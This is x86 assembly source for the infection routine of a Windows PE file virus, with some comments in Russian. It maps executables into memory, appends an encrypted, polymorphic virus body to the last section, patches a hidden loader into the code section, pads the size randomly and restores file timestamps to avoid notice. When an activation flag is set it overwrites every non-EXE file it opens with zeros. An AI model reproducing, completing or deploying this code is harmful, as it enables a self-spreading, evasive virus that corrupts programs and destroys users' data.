;
__x	equ rec;dta

infect:

	mov 1 ptr [ebp+isjmp-__x], 0
	;mov byte ptr [firstinf], 0
 	; open file
	sub esi, esi
	push esi
	lea eax, [fdata]
	mov ebx, [eax].fd_lsize
	mov [fsize], ebx
	push dword ptr [eax].fd_attr ; FILE_ATTRIBUTE_NORMAL
	push OPEN_EXISTING
	push esi
	push FILE_SHARE_READ+FILE_SHARE_WRITE
	push GENERIC_READ+GENERIC_WRITE
	lea eax, [eax].fd_fname
	push eax
	xcall CreateFileA
	mov [ahand], eax

	; check for error
	cmp eax,-1
	jz infectret

	; create mapping
	push esi esi esi PAGE_READWRITE esi
	push eax
	xcall CreateFileMappingA
	mov [hmap], eax
	push esi esi esi FILE_MAP_ALL_ACCESS
	push eax
	xcall MapViewOfFile
	test eax, eax
	jz notape1
	mov ebx, eax ; ebx - указатель на буфер файла
	mov [fbase], ebx ; сохраняем адрес области памяти файла

	cmp 1 ptr [ebp+act-__x], 0
	jz __5345
	; if activization, zapping all files besides EXE 
	cmp 2 ptr [ebx], 'ZM'
	jz __5345
	sub al, al
	mov ecx, [fdata].fd_lsize
	dec ecx
	mov edi, ebx
	rep stosb
	jmp notape
__5345:

	mov eax, [ebx].mz_neptr
	; check pe-file validity
	cmp eax, [fdata].fd_lsize
	jnb notape		; exit if pe-file is invalid
	add ebx, eax
	; ebx -> pe-header

	cmp 2 ptr [ebx], 'EP'
	jnz notape

	; check for console application
	; skipping console apps, because they are 
	; running with command-line arguments
	cmp [ebx].pe_subsystem, 3
	jz notape

tape:
	push [fbase]
	xcall UnmapViewOfFile
	push [hmap]
	xcall CloseHandle
	push [ahand]
	xcall CloseHandle

	mov [success], 0

	; find UEP

	; wrong WINAPI table
	push 0
	apiaddr CreateProcessA, __x
	push eax
	apiaddr CreateProcessW, __x
	push eax
	apiaddr CreateWindowExA, __x
	push eax
	apiaddr CreateWindowExW, __x
	push eax
	apiaddr MessageBoxExA, __x
	push eax
	apiaddr MessageBoxExW, __x
	push eax
	apiaddr MessageBoxA, __x
	push eax
	apiaddr MessageBoxW, __x
	push eax
	apiaddr DialogBoxParamA, __x
	push eax
	apiaddr DialogBoxParamW, __x
	push eax
	apiaddr DialogBoxIndirectParamA, __x
	push eax
	apiaddr DialogBoxIndirectParamW, __x
	push eax
	apiaddr CreateDialogParamA, __x
	push eax
	apiaddr CreateDialogParamW, __x
	push eax
	apiaddr AllocConsole, __x
	push eax
	apiaddr Beep, __x
	push eax
	mov edx, esp
		
	lea eax, [infected]
	push eax
	lea eax, [ebp+virstart-__x]
	push eax
	push edx	; wrong WINAPI table
	push [tbl]	; opcodes table
	lea eax, [injofs]
	push eax
	push loader_size*loader_mult
	lea eax, [jmpofs]
	push eax
	lea eax, [jmpflag]
	push eax
	lea eax, [fdata].fd_fname
	push eax
;nop
;int 3
	call find_uep
	add esp, 17*4
	or eax, eax
	jnz __process_file

	cmp [infected], 0
	jz __infret
;	mov [firstinf], 1

__infret:
	jmp infectret

__process_file:

	mov ecx, virsize+8
	rdtsc
	and eax, 0FFFh	; increasing virus size by random number of bytes
	add eax, ecx
	mov [ebp+vvir_size-__x], eax	

	; open file for reading
	push 0
	lea eax, [fdata]
	mov ebx, [eax].fd_lsize
	mov [fsize], ebx
	push dword ptr [eax].fd_attr
	push OPEN_EXISTING
	push 0
	push FILE_SHARE_READ
	push GENERIC_READ
	lea eax, [eax].fd_fname
	push eax
	xcall CreateFileA
	; save handle of file
	mov [ahand], eax
	; check for error
	cmp eax,-1
	jz infectret

	; create mapping
	push 0 0 0 PAGE_READONLY 0
	push eax
	xcall CreateFileMappingA
	mov [hmap], eax
	push 0 0 0 FILE_MAP_READ
	push eax
	xcall MapViewOfFile
	test eax, eax
	jz notape1
	mov ebx, eax ; ebx -> file buffer
	mov [fbase], ebx ; save the address of file buffer

	mov eax, [ebx].mz_neptr
	add ebx, eax
	; ebx -> pe-header

	movzx ecx, [ebx].pe_numofobjects	; число секций

	lea edi, [ebx+pe_size]
	; edi -> section table
	; look for section with entry point
__secsearch1:
	mov edx, [ebx].pe_entrypointrva 
	sub edx, [edi].oe_virt_rva 
	jl dy
	cmp edx, [edi].oe_virt_size  
	jnb dy
	test [edi].oe_flags, 20000000h
	jz dy 
	; refusing not executable sections

	mov esi, [edi].oe_phys_offs
	mov [codesegphysaddr], esi ; for future using

	; set return address to infected program
	mov esi, [edi].oe_virt_rva
	add esi, [ebx].pe_imagebase
	cmp [jmpflag], 0
	jnz __jmpofs_set
	add esi, [injofs]
	jmp __98
__jmpofs_set:
	add esi, [jmpofs]
__98:
	mov [ebp+retaddr-__x], esi
	jmp fi

dy:
	add eax, oe_size
	loop __secsearch1
	; section with EP not found
	jmp notape

fi:
	; section with EP found

	; look for last section
	lea edi, [ebx+pe_size]
	movzx ecx, [ebx].pe_numofobjects
	dec ecx
	; setions are in increasing RVA order
__secsearch2:
	add edi, oe_size
	loop __secsearch2
	mov eax, edi
	sub eax, ebx
	mov [diffaddr], eax	
	mov eax, [edi].oe_phys_size
	sub eax, [edi].oe_virt_size

;	jb notape	; do not touch if virtual size greater than physical??

	mov edx, [edi].oe_phys_offs
	add edx, [edi].oe_virt_size	; add virus to virtual part of last section
	mov [fpos], edx		 ; remember physical position of visus code
	add edx, [ebp+vvir_size-__x]
	mov eax, edx
	sub edx, edx
	mov ecx, [ebx].pe_filealign
	or ecx, ecx
	jz notape
	div ecx
	inc eax
	mul ecx
	mov [newfsize], eax	; new size of file

	mov edx, [edi].oe_virt_rva
	add edx, [edi].oe_virt_size 
	mov [rvapos], edx	; remember RVA of virus code
	; mov [ebp+repl-__x].from_rva, edx
	add edx, [ebp+vvir_size-__x]
	mov eax, edx
	sub edx, edx
	mov ecx, [ebx].pe_objectalign
	or ecx, ecx
	jz notape
	div ecx
	inc eax
	mul ecx
	mov [newimagesize], eax	; new imagesize with alignment

	; new physical size of last section
	mov eax, [edi].oe_virt_size	; virt!
	add eax, [ebp+vvir_size-__x]
	sub edx, edx
	mov ecx, [ebx].pe_filealign
	div ecx
	inc eax
	mul ecx
	mov [newsectionphyssize], eax

	; new virtual size of last section
	mov eax, [edi].oe_virt_size	; virt!
	add eax, [ebp+vvir_size-__x];virsize+4
	; virtual size is not rounded
	;sub edx, edx
	;mov ecx, [ebx].pe_objectalign
	;div ecx
	;inc eax
	;mul ecx
	mov [newsectionvirtsize], eax


	; get physical address of loader
	mov eax, [codesegphysaddr]
	add eax, [injofs]
	mov [loaderphysaddr], eax
	; узнаем RVA загрузчика
	mov eax, [ebp+retaddr-__x]

	cmp [jmpflag], 0	; if we have jmp correct RVA of loader
	jz __476
	mov [ebp+jmpreplace-__x].to_rva, eax
	sub eax, [jmpofs]
	add eax, [injofs]

__476:
	mov [ebp+replace-__x].to_rva, eax


	; allocate memory for virus 
	mov eax, [ebp+vvir_size-__x]
	add eax, 2000h
	call _valloc
	jz notape
	mov [virbuf], eax

	mov eax, [jmpflag]
	mov 1 ptr [ebp+isjmp-__x], al

	; copy code at loader's place to backup buffer
	mov edx, [codesegphysaddr]
	add edx, [injofs]
	add edx, [fbase]
	mov esi, edx
	lea edi, [ebp+backup-__x]
	mov ecx, loader_size*loader_mult
	rep movsb

	cmp [jmpflag], 0	; if we have jmp
	jz __479
	; copy code at jmp's place to backup buffer
	mov edx, [codesegphysaddr]
	add edx, [jmpofs]
	add edx, [fbase]
	mov esi, edx
	lea edi, [ebp+jmpbackup-__x]
	mov ecx, jmpsize
	rep movsb
__479:



;nop
;int 3
	call _morph
	; из старого варианта - генерирование ключа
	rdtsc
	mov [enchash], eax
;	mov 4 ptr [ebp+__hash_rva-__x], eax	; hash
	mov 4 ptr [ebp+vloader_size-__x], loader_size*loader_mult

	; copy virus to buffer and encrypt it
	mov 1 ptr [ebp+dropper-__x], 0
	mov edx, [enchash]
	mov edi, [virbuf]
	lea esi, [ebp+virstart-__x]
	mov ecx, [ebp+vvir_size-__x];virsize+8
	call _encryptor



	; forming loader-decryptor
	mov edx, [rvapos]
	add edx, [ebx].pe_imagebase	; edx = RVA of virus in infected program
	mov 4 ptr [ebp+__vir_rva-__x], edx
	mov eax, [ebp+vvir_size-__x]		; size of virus
	sar eax, 2	;	/4
	mov 4 ptr [ebp+__vir_size_offs-__x], eax
	sal eax, 2	;	*4
	add eax, 2000h
	neg eax
	mov 4 ptr [ebp+__vir_size_offs2-__x], eax
	; offset from esp to write virus body. virus is written in unused part of stack	

;nop 
;int 3

	; permutate loader
	call permutate
	mov eax, [ebp+vloader_size-__x]
	mov [ebp+replace-__x].sizeinbytes, eax

	push [fbase]
	xcall UnmapViewOfFile
	push [hmap]
	xcall CloseHandle
	push [ahand]
	xcall CloseHandle

	; reopen file for writing
	push 0
	lea eax, [fdata]
	mov ebx, [eax].fd_lsize
	mov [fsize], ebx
	push dword ptr [eax].fd_attr ; FILE_ATTRIBUTE_NORMAL
	push OPEN_EXISTING
	push 0
	push FILE_SHARE_READ+FILE_SHARE_WRITE
	push GENERIC_READ+GENERIC_WRITE
	lea eax, [eax].fd_fname
	push eax
	xcall CreateFileA

	mov dword ptr [ahand], eax
	cmp eax,-1
	jz infectret

	; create mapping with new size of file
	push 0
	push [newfsize]
	push 0 PAGE_READWRITE 0
	push eax
	xcall CreateFileMappingA
	mov [hmap], eax
	push 0
	push 0
	push 0 FILE_MAP_ALL_ACCESS
	push eax
	xcall MapViewOfFile
	test eax, eax
	jz notape1
	mov ebx, eax ; ebx -> file buffer
	mov [fbase], ebx ; save address of file buffer 

	mov eax, [ebx].mz_neptr
	add ebx, eax
	; ebx -> pe-header

	mov eax, [newimagesize]		
	mov [ebx].pe_imagesize, eax
	; increase size of stack if necessary
	mov eax, 10000h
	cmp [ebx].pe_stackreservesize, eax
	jge __345
	mov [ebx].pe_stackreservesize, eax
__345:
	cmp [ebx].pe_stackcommitsize, eax
	jge __346
	mov [ebx].pe_stackcommitsize, eax
__346:
	; modify section table
	mov edi, ebx
	add edi, [diffaddr]
	mov eax, [newsectionphyssize]
	mov [edi].oe_phys_size, eax
	mov eax, [newsectionvirtsize]
	mov [edi].oe_virt_size, eax


	; modify code section
	mov edi, [codesegphysaddr]
	add edi, [injofs]
	add edi, [fbase]
;	mov edi, edx
	mov esi, [loaderbuf]
	mov ecx, [ebp+vloader_size-__x]
	rep movsb

	cmp [jmpflag], 0
	jz __78
;	mov 1 ptr [ebp+isjmp-__x], 1	; set jmp flag if there is jmp
	; write jmp 
	mov edx, [codesegphysaddr]
	add edx, [jmpofs]
	add edx, [fbase]
	mov 1 ptr [edx], 0E9h
	mov edi, [injofs]
	sub edi, [jmpofs]
	sub edi, 5	
	mov 4 ptr [edx+1], edi
__78:

	; write encrypted code
	mov esi, [virbuf]
	mov edi, [fpos]
	add edi, [fbase]
	mov ecx, [ebp+vvir_size-__x];virsize+8
	rep movsb
	
	; free virus buffer	
	mov eax, [virbuf]
	call _vfree

	inc [countinfect]

	mov [success], 1

IF NORELEASE EQ 1
	; beep if infected 
	push 200 400
	xcall Beep
ENDIF


notape:
	push [fbase]
	xcall UnmapViewOfFile
notape1:
	push [hmap]
	xcall CloseHandle
notape2:
	; restore file times
	lea eax, [fdata].fd_lastwrtime
	push eax
	sub eax, 8 ;eax->lastaccesstime
	push eax
	sub eax, 8 ;eax->createtime
	push eax
	push [ahand]
	xcall SetFileTime

	push [ahand]
	xcall CloseHandle


infectret:
	ret


_rva_to_phys:
; in
; edi -> PE header
; eax = RVA
; out
; eax = PHYS_ADDR

	push ecx edx
	lea edx, [edi+pe_size]
__loop_sect:
	mov ecx, eax
	sub ecx, [edx].oe_virt_rva
	jl __19
	cmp ecx, [edx].oe_virt_size
	jl __found_sec
__19:
	add edx, oe_size
	cmp 4 ptr [edx], 0
	jnz __loop_sect
__sec_not_found:
	push 0
	jmp __sret
__found_sec:
	add ecx, [edx].oe_phys_offs
	push ecx

__sret:
	pop eax
	pop edx ecx
	ret


include crypt.inc

